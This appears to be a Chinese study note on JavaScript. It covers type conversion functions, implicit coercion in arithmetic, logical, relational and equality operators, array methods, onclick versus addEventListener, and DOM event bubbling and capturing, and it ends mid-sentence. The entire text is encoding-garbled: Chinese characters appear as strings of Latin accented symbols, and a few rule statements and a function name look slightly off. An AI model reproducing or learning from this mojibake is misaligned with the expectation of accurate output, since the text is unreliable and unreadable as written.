å¦‚æžœæ˜¯å­—ç¬¦ä¸²ï¼Œéµå¾ªä»¥ä¸‹è§„åˆ™ï¼š 1. å¦‚æžœå­—ç¬¦ä¸²ä¸­åªåŒ…å«æ•°å­—ï¼Œåˆ™å°†å…¶è½¬æ¢ä¸ºåè¿›åˆ¶ï¼ˆå¿½ç•¥å‰å¯¼0ï¼Œå‰é¢æ­£è´Ÿå·æœ‰æ•ˆï¼‰å¦‚æžœå­—ç¬¦ä¸²ä¸­åŒ…å«æœ‰æ•ˆçš„æµ®ç‚¹æ ¼å¼ï¼Œåˆ™å°†å…¶è½¬æ¢ä¸ºå¯¹åº”çš„æµ®ç‚¹æ•°å€¼ï¼ˆå¿½ç•¥å‰å¯¼0ï¼Œå‰é¢æ­£è´Ÿå·æœ‰æ•ˆï¼‰ 2. å¦‚æžœå­—ç¬¦ä¸²æ˜¯ç©ºçš„ï¼ˆä¸åŒ…å«ä»»ä½•å­—ç¬¦ï¼‰ï¼Œåˆ™å°†å…¶è½¬æ¢ä¸º 0 3. å¦‚æžœå­—ç¬¦ä¸²ä¸­åŒ…å«æœ‰æ•ˆçš„åå…­è¿›åˆ¶æ ¼å¼ï¼Œåˆ™è½¬æ¢ä¸ºç›¸åŒå¤§å°çš„åè¿›åˆ¶æ•´æ•°å€¼ 4. å¦‚æžœå­—ç¬¦ä¸²ä¸­åŒ…å«ä¸Šè¿°æ ¼å¼ä¹‹åŽçš„å­—ç¬¦ï¼Œåˆ™å°†å…¶è½¬æ¢ä¸º NaN å¦‚æžœæ˜¯å¯¹è±¡ï¼Œåˆ™è°ƒç”¨å¯¹è±¡çš„ valueOf() æ–¹æ³•ï¼Œç„¶åŽæŒ‰ç…§å‰é¢çš„è§„åˆ™è¿›è¡Œè½¬æ¢è¿”å›žçš„å€¼ï¼Œå¦‚æžœæ˜¯è½¬æ¢ç»“æžœæ˜¯ NaN,åˆ™è°ƒç”¨å¯¹è±¡çš„ toString() æ–¹æ³•ï¼Œç„¶åŽå†ä¸€æ¬¡æŒ‰ç…§å‰é¢çš„è§„åˆ™è¿›è¡Œè¿”å›žçš„å­—ç¬¦ä¸²å€¼çš„è½¬æ¢ ä¸‹è¡¨æ˜¯å¯¹è±¡çš„ valueOf() çš„è¿”å›žå€¼ å¯¹è±¡ è¿”å›žå€¼ Array æ•°ç»„çš„å…ƒç´ è¢«è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œè¿™äº›å­—ç¬¦ä¸²ç”±é€—å·åˆ†éš”ï¼Œè¿žæŽ¥åœ¨ä¸€èµ·ã€‚å…¶æ“ä½œä¸Ž Array.toString å’Œ Array.join æ–¹æ³•ç›¸åŒã€‚ Boolean Boolean å€¼ã€‚ Date å­˜å‚¨çš„æ—¶é—´æ˜¯ä»Ž 1970 å¹´ 1 æœˆ 1 æ—¥åˆå¤œå¼€å§‹è®¡çš„æ¯«ç§’æ•° UTC Function å‡½æ•°æœ¬èº« Number æ•°å­—å€¼ Object å¯¹è±¡æœ¬èº«ã€‚è¿™æ˜¯é»˜è®¤æƒ…å†µ String å­—ç¬¦ä¸²å€¼ ç”±äºŽ Numberï¼ˆï¼‰å‡½æ•°åœ¨è½¬æ¢å­—ç¬¦ä¸²æ—¶åŽŸç†æ¯”è¾ƒå¤æ‚ï¼Œä¸”ä¸å¤Ÿåˆç†ï¼Œå› æ­¤åœ¨å¤„ç†å­—ç¬¦ä¸²æ—¶ï¼Œæ›´å¸¸ç”¨çš„æ˜¯ parseInt() å‡½æ•° parstInt(string,radix)å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´æ•°ç±»åž‹çš„æ•°å€¼ï¼Œå…¶è§„åˆ™ï¼š å¿½ç•¥å‰é¢å­—ç¬¦ä¸²å‰é¢çš„ç©ºæ ¼ï¼Œç›´è‡³æ‰¾åˆ°ç¬¬ä¸€ä¸ªéžç©ºæ ¼å­—ç¬¦ å¦‚æžœç¬¬ä¸€ä¸ªå­—ç¬¦ä¸æ˜¯æ•°å­—å­—ç¬¦æˆ–è€…è´Ÿå·ï¼Œå°±ä¼šè¿”å›ž NaNï¼ˆä¹Ÿå°±æ˜¯é‡åˆ°ç©ºå­—ç¬¦ä¼šè¿”å›ž NaNï¼‰ å¦‚æžœç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯æ•°å­—å­—ç¬¦ï¼Œä¼šç»§ç»­è§£æžç¬¬äºŒä¸ªå­—ç¬¦ï¼ŒçŸ¥é“è§£æžå®Œæ‰€æœ‰åŽç»­çš„å­—ç¬¦æˆ–è€…æ˜¯é‡åˆ°ä¸€ä¸ªéžæ•°å­—å­—ç¬¦ å¦‚æžœå­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯æ•°å­—å­—ç¬¦ï¼Œä¹Ÿèƒ½å¤Ÿè¯†åˆ«å„ç§è¿›åˆ¶ æœ€å¥½åœ¨ ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šè½¬æ¢çš„åŸºæ•°ï¼ˆè¿›åˆ¶ï¼‰ï¼Œå°±ä¸ä¼šæœ‰æ‰€æ­§ä¹‰ã€‚ parseFloat(string)å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæµ®ç‚¹æ•°ç±»åž‹çš„æ•°å€¼,è§„åˆ™ï¼š ä¸ŽparseInt()å‡½æ•°ç±»ä¼¼ï¼ŒparseFloat()ä¹Ÿæ˜¯ä»Žç¬¬ä¸€ä¸ªå­—ç¬¦(ä½ç½®0)å¼€å§‹è§£æžæ¯ä¸ªå­—ç¬¦ã€‚è€Œä¸”ä¹Ÿæ˜¯ä¸€ç›´è§£æžåˆ°å­—ç¬¦ä¸²æœ«å°¾ï¼Œæˆ–è€…è§£æžåˆ°é‡è§ä¸€ä¸ªæ— æ•ˆçš„æµ®ç‚¹æ•°å­—å­—ç¬¦ä¸ºæ­¢ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå­—ç¬¦ä¸²ä¸­çš„ç¬¬ä¸€ä¸ªå°æ•°ç‚¹æ˜¯æœ‰æ•ˆçš„ï¼Œè€Œç¬¬äºŒä¸ªå°æ•°ç‚¹å°±æ˜¯æ— æ•ˆçš„äº†ï¼Œå› æ­¤å®ƒåŽé¢çš„å­—ç¬¦ä¸²å°†è¢«å¿½ç•¥ã€‚ toString(radix)é™¤ undefined å’Œ nullä¹‹å¤–çš„æ‰€æœ‰ç±»åž‹çš„å€¼éƒ½å…·æœ‰ toString()æ–¹æ³•ï¼Œå…¶ä½œç”¨æ˜¯è¿”å›žå¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºã€‚ å¤šæ•°æƒ…å†µä¸‹ï¼Œè°ƒç”¨toString()æ–¹æ³•ä¸å¿…ä¼ é€’å‚æ•°ã€‚ä½†æ˜¯ï¼Œåœ¨è°ƒç”¨æ•°å€¼çš„toString()æ–¹æ³•æ—¶ï¼Œå¯ä»¥ä¼ é€’ä¸€ä¸ªå‚æ•°ï¼šè¾“å‡ºæ•°å€¼çš„åŸºæ•°ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒtoString()æ–¹æ³•ä»¥åè¿›åˆ¶æ ¼å¼è¿”å›žæ•°å€¼çš„å­—ç¬¦ä¸²è¡¨ç¤ºã€‚ å¯¹è±¡ æ“ä½œ Array å°† Array çš„å…ƒç´ è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚ç»“æžœå­—ç¬¦ä¸²ç”±é€—å·åˆ†éš”ï¼Œä¸”è¿žæŽ¥èµ·æ¥ Boolean å¦‚æžœ Boolean å€¼æ˜¯ trueï¼Œåˆ™è¿”å›ž â€œtrueâ€ã€‚å¦åˆ™ï¼Œè¿”å›ž â€œfalseâ€ Date è¿”å›žæ—¥æœŸçš„æ–‡å­—è¡¨ç¤ºæ³• Error è¿”å›žä¸€ä¸ªåŒ…å«ç›¸å…³é”™è¯¯ä¿¡æ¯çš„å­—ç¬¦ä¸² Function è¿”å›žå¦‚ä¸‹æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œå…¶ä¸­ functionname æ˜¯è¢«è°ƒç”¨ toString æ–¹æ³•å‡½æ•°çš„åç§°ï¼šfunction functionname( ) { [native code]} Number è¿”å›žæ•°å­—çš„æ–‡å­—è¡¨ç¤º String è¿”å›ž String å¯¹è±¡çš„å€¼ é»˜è®¤ è¿”å›ž â€œ[object objectname]â€ï¼Œå…¶ä¸­ objectname æ˜¯å¯¹è±¡ç±»åž‹çš„åç§° åœ¨ä¸çŸ¥é“è¦è½¬æ¢çš„å€¼æ˜¯ä¸æ˜¯nullæˆ–undefinedçš„æƒ…å†µä¸‹ï¼Œè¿˜å¯ä»¥ä½¿ç”¨è½¬åž‹å‡½æ•°String()ï¼Œè¿™ä¸ªå‡½æ•°èƒ½å¤Ÿå°†ä»»ä½•ç±»åž‹çš„å€¼è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚ String(mix)å°†ä»»ä½•ç±»åž‹çš„å€¼è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œå…¶è§„åˆ™ä¸ºï¼š å¦‚æžœæœ‰toString()æ–¹æ³•ï¼Œåˆ™è°ƒç”¨è¯¥æ–¹æ³•ï¼ˆä¸ä¼ é€’radixå‚æ•°ï¼‰å¹¶è¿”å›žç»“æžœ å¦‚æžœæ˜¯nullï¼Œè¿”å›žâ€nullâ€ å¦‚æžœæ˜¯undefinedï¼Œè¿”å›žâ€undefinedâ€ Boolean(mix)å°†ä»»ä½•ç±»åž‹çš„å€¼è½¬æ¢ä¸ºå¸ƒå°”å€¼ã€‚ ä»¥ä¸‹å€¼ä¼šè¢«è½¬æ¢ä¸ºfalseï¼šfalseã€â€â€ã€0ã€NaNã€nullã€undefinedï¼Œå…¶ä½™ä»»ä½•å€¼éƒ½ä¼šè¢«è½¬æ¢ä¸ºtrueã€‚ éšå¼è½¬æ¢ï¼ˆéžå¼ºåˆ¶è½¬æ¢ç±»åž‹ï¼‰åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå³ä½¿æˆ‘ä»¬ä¸æä¾›æ˜¾ç¤ºè½¬æ¢ï¼ŒJavascriptä¹Ÿä¼šè¿›è¡Œè‡ªåŠ¨ç±»åž‹è½¬æ¢ï¼Œä¸»è¦æƒ…å†µæœ‰ï¼š isNaN(mix)ç”¨äºŽæ£€æµ‹æ˜¯å¦ä¸ºéžæ•°å€¼çš„å‡½æ•°. ç»æµ‹è¯•å‘çŽ°ï¼Œè¯¥å‡½æ•°ä¼šå°è¯•å°†å‚æ•°å€¼ç”¨ Number() è¿›è¡Œè½¬æ¢ï¼Œå¦‚æžœç»“æžœä¸ºâ€œéžæ•°å€¼â€åˆ™è¿”å›ž trueï¼Œå¦åˆ™è¿”å›ž falseã€‚ é€’å¢žé€’å‡æ“ä½œç¬¦ï¼ˆåŒ…æ‹¬å‰ç½®å’ŒåŽç½®ï¼‰ã€ä¸€å…ƒæ­£è´Ÿç¬¦å·æ“ä½œç¬¦ï¼ˆç»è¿‡å¯¹æ¯”å‘çŽ°ï¼Œå…¶è§„åˆ™ä¸ŽNumber()è§„åˆ™åŸºæœ¬ç›¸åŒï¼‰ å¦‚æžœæ˜¯åŒ…å«æœ‰æ•ˆæ•°å­—å­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œå…ˆå°†å…¶è½¬æ¢ä¸ºæ•°å­—å€¼ï¼ˆè½¬æ¢è§„åˆ™åŒ Number()ï¼‰ï¼Œå†æ‰§è¡ŒåŠ å‡1çš„æ“ä½œï¼Œå­—ç¬¦ä¸²å˜é‡å˜ä¸ºæ•°å€¼å˜é‡ã€‚ å¦‚æžœæ˜¯ä¸åŒ…å«æœ‰æ•ˆæ•°å­—å­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œå°†å˜é‡çš„å€¼è®¾ç½®ä¸º NaNï¼Œå­—ç¬¦ä¸²å˜é‡å˜æˆæ•°å€¼å˜é‡ã€‚ å¦‚æžœæ˜¯å¸ƒå°”å€¼ falseï¼Œå…ˆå°†å…¶è½¬æ¢ä¸º0å†æ‰§è¡ŒåŠ å‡1çš„æ“ä½œï¼Œå¸ƒå°”å€¼å˜é‡ç¼–ç¨‹æ•°å€¼å˜é‡ã€‚ å¦‚æžœæ˜¯å¸ƒå°”å€¼ trueï¼Œå…ˆå°†å…¶è½¬æ¢ä¸º1å†æ‰§è¡ŒåŠ å‡1çš„æ“ä½œï¼Œå¸ƒå°”å€¼å˜é‡å˜æˆæ•°å€¼å˜é‡ã€‚ å¦‚æžœæ˜¯æµ®ç‚¹æ•°å€¼ï¼Œæ‰§è¡ŒåŠ å‡1çš„æ“ä½œã€‚ å¦‚æžœæ˜¯å¯¹è±¡ï¼Œå…ˆè°ƒç”¨å¯¹è±¡çš„ valueOf() æ–¹æ³•ï¼Œç„¶åŽå¯¹è¯¥è¿”å›žå€¼åº”ç”¨å‰é¢çš„è§„åˆ™ã€‚å¦‚æžœç»“æžœæ˜¯ NaNï¼Œåˆ™è°ƒç”¨ toString() æ–¹æ³•åŽå†åº”ç”¨å‰é¢çš„è§„åˆ™ã€‚å¯¹è±¡å˜é‡å˜æˆæ•°å€¼å˜é‡ã€‚ åŠ æ³•è¿ç®—æ“ä½œç¬¦åŠ å·è¿ç®—æ“ä½œç¬¦åœ¨Javascriptä¹Ÿç”¨äºŽå­—ç¬¦ä¸²è¿žæŽ¥ç¬¦ï¼Œæ‰€ä»¥åŠ å·æ“ä½œç¬¦çš„è§„åˆ™åˆ†ä¸¤ç§æƒ…å†µï¼š å¦‚æžœä¸¤ä¸ªæ“ä½œå€¼éƒ½æ˜¯æ•°å€¼ï¼Œå…¶è§„åˆ™ä¸ºï¼š å¦‚æžœä¸€ä¸ªæ“ä½œæ•°ä¸º NaNï¼Œåˆ™ç»“æžœä¸º NaN å¦‚æžœæ˜¯ Infinity+Infinityï¼Œç»“æžœæ˜¯ Infinity å¦‚æžœæ˜¯ -Infinity+(-Infinity)ï¼Œç»“æžœæ˜¯ -Infinity å¦‚æžœæ˜¯ Infinity+(-Infinity)ï¼Œç»“æžœæ˜¯ NaN. å¦‚æžœæ˜¯ +0+(+0)ï¼Œç»“æžœä¸º +0 å¦‚æžœæ˜¯ (-0)+(-0)ï¼Œç»“æžœä¸º -0. å¦‚æžœæ˜¯ (+0)+(-0)ï¼Œç»“æžœä¸º +0 å¦‚æžœæœ‰ä¸€ä¸ªæ“ä½œå€¼ä¸ºå­—ç¬¦ä¸²ï¼Œåˆ™ï¼š å¦‚æžœä¸¤ä¸ªæ“ä½œå€¼éƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œåˆ™å°†å®ƒä»¬æ‹¼æŽ¥èµ·æ¥ å¦‚æžœåªæœ‰ä¸€ä¸ªæ“ä½œå€¼ä¸ºå­—ç¬¦ä¸²ï¼Œåˆ™å°†å¦å¤–æ“ä½œå€¼è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œç„¶åŽæ‹¼æŽ¥èµ·æ¥2. å¦‚æžœä¸€ä¸ªæ“ä½œæ•°æ˜¯å¯¹è±¡ã€æ•°å€¼æˆ–è€…å¸ƒå°”å€¼ï¼Œåˆ™è°ƒç”¨toString()æ–¹æ³•å–å¾—å­—ç¬¦ä¸²å€¼ï¼Œç„¶åŽå†åº”ç”¨å‰é¢çš„å­—ç¬¦ä¸²è§„åˆ™ã€‚ å¯¹äºŽundefinedå’Œnullï¼Œåˆ†åˆ«è°ƒç”¨String()æ˜¾å¼è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚ å¯ä»¥çœ‹å‡ºï¼ŒåŠ æ³•è¿ç®—ä¸­ï¼Œå¦‚æžœæœ‰ä¸€ä¸ªæ“ä½œå€¼ä¸ºå­—ç¬¦ä¸²ç±»åž‹ï¼Œåˆ™å°†å¦ä¸€ä¸ªæ“ä½œå€¼è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œæœ€åŽè¿žæŽ¥èµ·æ¥ã€‚ ä¹˜é™¤ã€å‡å·è¿ç®—ç¬¦ã€å–æ¨¡è¿ç®—ç¬¦è¿™äº›æ“ä½œç¬¦é’ˆå¯¹çš„æ˜¯è¿ç®—ï¼Œæ‰€ä»¥ä»–ä»¬å…·æœ‰å…±åŒæ€§ï¼šå¦‚æžœæ“ä½œå€¼ä¹‹ä¸€ä¸æ˜¯æ•°å€¼ï¼Œåˆ™è¢«éšå¼è°ƒç”¨Number()å‡½æ•°è¿›è¡Œè½¬æ¢ã€‚å…·ä½“æ¯ä¸€ç§è¿ç®—çš„è¯¦ç»†è§„åˆ™è¯·å‚è€ƒECMAScriptä¸­çš„å®šä¹‰ã€‚ é€»è¾‘æ“ä½œç¬¦ï¼ˆ!ã€&amp;&amp;ã€||ï¼‰é€»è¾‘éžï¼ˆï¼ï¼‰æ“ä½œç¬¦é¦–å…ˆé€šè¿‡Boolean()å‡½æ•°å°†å®ƒçš„æ“ä½œå€¼è½¬æ¢ä¸ºå¸ƒå°”å€¼ï¼Œç„¶åŽæ±‚åã€‚ é€»è¾‘ä¸Žï¼ˆ&amp;&amp;ï¼‰æ“ä½œç¬¦ï¼Œå¦‚æžœä¸€ä¸ªæ“ä½œå€¼ä¸æ˜¯å¸ƒå°”å€¼æ—¶ï¼Œéµå¾ªä»¥ä¸‹è§„åˆ™è¿›è¡Œè½¬æ¢ï¼š å¦‚æžœç¬¬ä¸€ä¸ªæ“ä½œå€¼ç» Boolean() è½¬æ¢åŽä¸º trueï¼Œåˆ™è¿”å›žç¬¬äºŒä¸ªæ“ä½œå€¼ï¼Œå¦åˆ™è¿”å›žç¬¬ä¸€ä¸ªå€¼ï¼ˆä¸æ˜¯Boolean() è½¬æ¢åŽçš„å€¼ï¼‰ å¦‚æžœç¬¬ä¸€ä¸ªæ“ä½œå€¼æ˜¯å¯¹è±¡ï¼Œåˆ™è¿”å›žç¬¬äºŒä¸ªæ“ä½œå€¼ å¦‚æžœä¸¤ä¸ªæ“ä½œå€¼éƒ½æ˜¯å¯¹è±¡ï¼Œåˆ™è¿”å›žç¬¬äºŒä¸ªæ“ä½œå€¼ å¦‚æžœæœ‰ä¸€ä¸ªæ“ä½œå€¼ä¸º nullï¼Œè¿”å›ž null å¦‚æžœæœ‰ä¸€ä¸ªæ“ä½œå€¼ä¸º NaNï¼Œè¿”å›ž NaN å¦‚æžœæœ‰ä¸€ä¸ªæ“ä½œå€¼ä¸º undefinedï¼Œè¿”å›ž undefined é€»è¾‘æˆ–ï¼ˆ||ï¼‰æ“ä½œç¬¦ï¼Œå¦‚æžœä¸€ä¸ªæ“ä½œå€¼ä¸æ˜¯å¸ƒå°”å€¼ï¼Œéµå¾ªä»¥ä¸‹è§„åˆ™ å¦‚æžœç¬¬ä¸€ä¸ªæ“ä½œå€¼ç» Boolean() è½¬æ¢åŽä¸º falseï¼Œåˆ™è¿”å›žç¬¬äºŒä¸ªæ“ä½œå€¼ï¼Œå¦åˆ™è¿”å›žç¬¬ä¸€ä¸ªæ“ä½œå€¼ï¼ˆä¸æ˜¯Boolean() è½¬æ¢åŽçš„å€¼ï¼‰ å¦‚æžœä¸¤ä¸ªæ“ä½œå€¼éƒ½æ˜¯å¯¹è±¡ï¼Œåˆ™è¿”å›žç¬¬ä¸€ä¸ªæ“ä½œå€¼ å¦‚æžœä¸¤ä¸ªæ“ä½œå€¼éƒ½ä¸º nullï¼Œè¿”å›ž null å¦‚æžœä¸¤ä¸ªæ“ä½œå€¼éƒ½ä¸º NaNï¼Œè¿”å›ž NaN å¦‚æžœä¸¤ä¸ªæ“ä½œå€¼éƒ½ä¸º undefinedï¼Œè¿”å›ž undefined å…³ç³»æ“ä½œç¬¦ï¼ˆ&lt;, &gt;, &lt;=, &gt;=ï¼‰ä¸Žä¸Šè¿°æ“ä½œç¬¦ä¸€æ ·ï¼Œå…³ç³»æ“ä½œç¬¦çš„æ“ä½œå€¼ä¹Ÿå¯ä»¥æ˜¯ä»»æ„ç±»åž‹çš„ï¼Œæ‰€ä»¥ä½¿ç”¨éžæ•°å€¼ç±»åž‹å‚ä¸Žæ¯”è¾ƒæ—¶ä¹Ÿéœ€è¦ç³»ç»Ÿè¿›è¡Œéšå¼ç±»åž‹è½¬æ¢ï¼š å¦‚æžœä¸¤ä¸ªæ“ä½œå€¼éƒ½æ˜¯æ•°å€¼ï¼Œåˆ™è¿›è¡Œæ•°å€¼æ¯”è¾ƒ å¦‚æžœä¸¤ä¸ªæ“ä½œå€¼éƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œåˆ™æ¯”è¾ƒå­—ç¬¦ä¸²å¯¹åº”çš„å­—ç¬¦ç¼–ç å€¼ å¦‚æžœåªæœ‰ä¸€ä¸ªæ“ä½œå€¼æ˜¯æ•°å€¼ï¼Œåˆ™å°†å¦ä¸€ä¸ªæ“ä½œå€¼è½¬æ¢ä¸ºæ•°å€¼ï¼Œè¿›è¡Œæ•°å€¼æ¯”è¾ƒ å¦‚æžœä¸€ä¸ªæ“ä½œæ•°æ˜¯å¯¹è±¡ï¼Œåˆ™è°ƒç”¨ valueOf() æ–¹æ³•ï¼ˆå¦‚æžœå¯¹è±¡æ²¡æœ‰ valueOf() æ–¹æ³•åˆ™è°ƒç”¨toString() æ–¹æ³•ï¼‰ï¼Œå¾—åˆ°çš„ç»“æžœæŒ‰ç…§å‰é¢çš„è§„åˆ™æ‰§è¡Œæ¯”è¾ƒ å¦‚æžœä¸€ä¸ªæ“ä½œå€¼æ˜¯å¸ƒå°”å€¼ï¼Œåˆ™å°†å…¶è½¬æ¢ä¸ºæ•°å€¼ï¼Œå†è¿›è¡Œæ¯”è¾ƒ æ³¨ï¼šNaN æ˜¯éžå¸¸ç‰¹æ®Šçš„å€¼ï¼Œå®ƒä¸å’Œä»»ä½•ç±»åž‹çš„å€¼ç›¸ç­‰ï¼ŒåŒ…æ‹¬å®ƒè‡ªå·±ï¼ŒåŒæ—¶å®ƒä¸Žä»»ä½•ç±»åž‹çš„å€¼æ¯”è¾ƒå¤§å°æ—¶éƒ½è¿”å›ž falseã€‚ ç›¸ç­‰æ“ä½œç¬¦ï¼ˆ==ï¼‰ç›¸ç­‰æ“ä½œç¬¦ä¼šå¯¹æ“ä½œå€¼è¿›è¡Œéšå¼è½¬æ¢åŽè¿›è¡Œæ¯”è¾ƒï¼š å¦‚æžœä¸€ä¸ªæ“ä½œå€¼ä¸ºå¸ƒå°”å€¼ï¼Œåˆ™åœ¨æ¯”è¾ƒä¹‹å‰å…ˆå°†å…¶è½¬æ¢ä¸ºæ•°å€¼ å¦‚æžœä¸€ä¸ªæ“ä½œå€¼ä¸ºå­—ç¬¦ä¸²ï¼Œå¦ä¸€ä¸ªæ“ä½œå€¼ä¸ºæ•°å€¼ï¼Œåˆ™é€šè¿‡Number()å‡½æ•°å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°å€¼ å¦‚æžœä¸€ä¸ªæ“ä½œå€¼æ˜¯å¯¹è±¡ï¼Œå¦ä¸€ä¸ªä¸æ˜¯ï¼Œåˆ™è°ƒç”¨å¯¹è±¡çš„ valueOf() æ–¹æ³•ï¼Œå¾—åˆ°çš„ç»“æžœæŒ‰ç…§å‰é¢çš„è§„åˆ™è¿›è¡Œæ¯”è¾ƒ nullä¸Žundefinedæ˜¯ç›¸ç­‰çš„ å¦‚æžœä¸€ä¸ªæ“ä½œå€¼ä¸º NaNï¼Œåˆ™ç›¸ç­‰æ¯”è¾ƒè¿”å›ž false å¦‚æžœä¸¤ä¸ªæ“ä½œå€¼éƒ½æ˜¯å¯¹è±¡ï¼Œåˆ™æ¯”è¾ƒå®ƒä»¬æ˜¯ä¸æ˜¯æŒ‡å‘åŒä¸€ä¸ªå¯¹è±¡ split()ã€join()çš„åŒºåˆ«å‰è€…æ˜¯åˆ‡å‰²æˆæ•°ç»„çš„å½¢å¼ åŽè€…æ˜¯å°†æ•°ç»„è½¬æ¢ä¸ºå­—ç¬¦ä¸² æ•°ç»„æ–¹æ³•pop/push/unshift/shift æ•°ç»„æ–¹æ³• æè¿° pop() åˆ é™¤åŽŸæ•°ç»„æœ€åŽä¸€é¡¹ï¼Œå¹¶è¿”å›žåˆ é™¤å…ƒç´ çš„å€¼ï¼›å¦‚æžœæ•°ç»„ä¸ºç©ºåˆ™è¿”å›žundefined push() å°†å‚æ•°æ·»åŠ åˆ°åŽŸæ•°ç»„æœ«å°¾ï¼Œå¹¶è¿”å›žæ•°ç»„çš„é•¿åº¦ unshift() å°†å‚æ•°æ·»åŠ åˆ°åŽŸæ•°ç»„å¼€å¤´ï¼Œå¹¶è¿”å›žæ•°ç»„çš„é•¿åº¦ shift() åˆ é™¤åŽŸæ•°ç»„ç¬¬ä¸€é¡¹ï¼Œå¹¶è¿”å›žåˆ é™¤å…ƒç´ çš„å€¼ï¼›å¦‚æžœæ•°ç»„ä¸ºç©ºåˆ™è¿”å›žundefined äº‹ä»¶ç»‘å®šå’Œæ™®é€šäº‹ä»¶æœ‰ä»€ä¹ˆåŒºåˆ«æ™®é€šäº‹ä»¶ä¸­çš„onclickæ˜¯DOM0çº§äº‹ä»¶åªæ”¯æŒå•ä¸ªäº‹ä»¶ï¼Œä¼šè¢«å…¶ä»–onclickäº‹ä»¶è¦†ç›–ï¼Œè€Œäº‹ä»¶ç»‘å®šä¸­çš„addEventListeneræ˜¯DOM2çº§äº‹ä»¶å¯ä»¥æ·»åŠ å¤šä¸ªäº‹ä»¶è€Œä¸ç”¨æ‹…å¿ƒè¢«è¦†ç›– æ™®é€šæ·»åŠ äº‹ä»¶çš„æ–¹æ³•ï¼š 1234567const btn = document.getElementById("hello");btn.onclick = function()&#123; alert(1);&#125;btn.onclick = function()&#123; alert(2);&#125; æ‰§è¡Œä¸Šé¢çš„ä»£ç åªä¼šalert 2 äº‹ä»¶ç»‘å®šæ–¹å¼æ·»åŠ äº‹ä»¶ï¼š 1234567const btn = document.getElementById("hello");btn.addEventListener("click",function()&#123; alert(1);&#125;,false);btn.addEventListener("click",function()&#123; alert(2);&#125;,false); æ‰§è¡Œä¸Šé¢çš„ä»£ç ä¼šå…ˆalert 1 å† alert 2 IE å’Œ DOM äº‹ä»¶æµæœ‰ä»€ä¹ˆåŒºåˆ«äº‹ä»¶ HTMLå…ƒç´ äº‹ä»¶æ˜¯æµè§ˆå™¨å†…åœ¨è‡ªåŠ¨äº§ç”Ÿçš„,å½“æœ‰äº‹ä»¶å‘ç”Ÿæ—¶htmlå…ƒç´ ä¼šå‘å¤–ç•Œ(è¿™é‡Œä¸»è¦æŒ‡å…ƒç´ äº‹ä»¶çš„è®¢é˜…è€…)å‘å‡ºå„ç§äº‹ä»¶,å¦‚click,onmouseover,onmouseoutç­‰ç­‰ã€‚ DOMäº‹ä»¶æµ DOM(æ–‡æ¡£å¯¹è±¡æ¨¡åž‹)ç»“æž„æ˜¯ä¸€ä¸ªæ ‘åž‹ç»“æž„ï¼Œå½“ä¸€ä¸ªHTMLå…ƒç´ äº§ç”Ÿä¸€ä¸ªäº‹ä»¶æ—¶ï¼Œè¯¥äº‹ä»¶ä¼šåœ¨å…ƒç´ ç»“ç‚¹ä¸Žæ ¹ç»“ç‚¹ä¹‹é—´çš„è·¯å¾„ä¼ æ’­ï¼Œè·¯å¾„æ‰€ç»è¿‡çš„ç»“ç‚¹éƒ½ä¼šæ”¶åˆ°è¯¥äº‹ä»¶ï¼Œè¿™ä¸ªä¼ æ’­è¿‡ç¨‹å¯ç§°ä¸ºDOMäº‹ä»¶æµã€‚ å†’æ³¡åž‹äº‹ä»¶(Bubbling) è¿™æ˜¯IEæµè§ˆå™¨å¯¹äº‹ä»¶æ¨¡åž‹çš„å®žçŽ°ã€‚å†’æ³¡ï¼Œé¡¾åæ€ä¹‰ï¼Œäº‹ä»¶åƒä¸ªæ°´ä¸­çš„æ°”æ³¡ä¸€æ ·ä¸€ç›´å¾€ä¸Šå†’ï¼Œç›´åˆ°é¡¶ç«¯ã€‚ä»ŽDOMæ ‘åž‹ç»“æž„ä¸Šç†è§£ï¼Œå°±æ˜¯äº‹ä»¶ç”±å¶å­ç»“ç‚¹æ²¿ç¥–å…ˆç»“ç‚¹ä¸€ç›´å‘ä¸Šä¼ é€’ç›´åˆ°æ ¹ç»“ç‚¹ï¼›ä»Žæµè§ˆå™¨ç•Œé¢è§†å›¾HTMLå…ƒç´ æŽ’åˆ—å±‚æ¬¡ä¸Šç†è§£å°±æ˜¯äº‹ä»¶ç”±å…·æœ‰ä»Žå±žå…³ç³»çš„æœ€ç¡®å®šçš„ç›®æ ‡å…ƒç´ ä¸€ç›´ä¼ é€’åˆ°æœ€ä¸ç¡®å®šçš„ç›®æ ‡å…ƒç´ . æ•èŽ·åž‹äº‹ä»¶(Capturing) Netscape Navigatorçš„å®žçŽ°ï¼Œå®ƒä¸Žå†’æ³¡åž‹åˆšå¥½ç›¸åï¼Œç”±DOMæ ‘æœ€é¡¶å±‚å…ƒç´ ä¸€ç›´åˆ°æœ€ç²¾ç¡®çš„å…ƒç´ ï¼Œç›´è§‚ä¸Šçš„ç†è§£åº”è¯¥å¦‚åŒå†’æ³¡åž‹ï¼Œäº‹ä»¶ä¼ é€’åº”è¯¥ç”±æœ€ç¡®å®šçš„å…ƒç´ ï¼Œå³äº‹ä»¶äº§ç”Ÿå…ƒç´ å¼€å§‹ã€‚ DOMæ ‡å‡†äº‹ä»¶æ¨¡åž‹ å› ä¸ºä¸¤ä¸ªä¸åŒçš„æ¨¡åž‹éƒ½æœ‰å…¶ä¼˜ç‚¹å’Œè§£é‡Šï¼ŒDOMæ 